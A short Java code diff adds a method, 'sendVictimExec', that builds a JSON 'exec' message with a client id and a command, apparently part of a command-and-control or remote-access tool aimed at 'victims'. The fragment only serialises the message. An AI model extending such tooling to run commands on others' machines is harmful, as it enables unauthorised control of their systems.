@@ -59,6 +59,21 @@ public class Commands {
         }
     }
 
+    public String sendVictimExec(String id,String command) {
+        try {
+            ObjectMapper mapper = new ObjectMapper();
+
+            ObjectNode response = mapper.createObjectNode();
+            response.put("type", "exec");
+            response.put("client_id", id);
+            response.put("command", command);
+            return response.toString();
+        } catch (Exception e) {
+            e.printStackTrace();
+            return "{\"type\":\"error\",\"message\":\"Failed to generate JSON\"}";
+        }
+    }
+
 
 
 }
